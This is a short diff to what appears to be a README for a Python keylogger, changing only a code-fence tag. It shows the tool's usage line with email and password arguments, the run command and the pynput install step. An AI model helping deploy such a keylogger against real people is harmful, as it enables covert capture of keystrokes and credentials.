@@ -8,6 +8,6 @@ k = keylogger("email","password")
 ```
 #### 2. python keylogger.py ( or python3 keylogger.py )
 #### Requirements :  pynput library
-```shell
+```sh
 pip install pynput ( or pip3 install pynput )
 ```
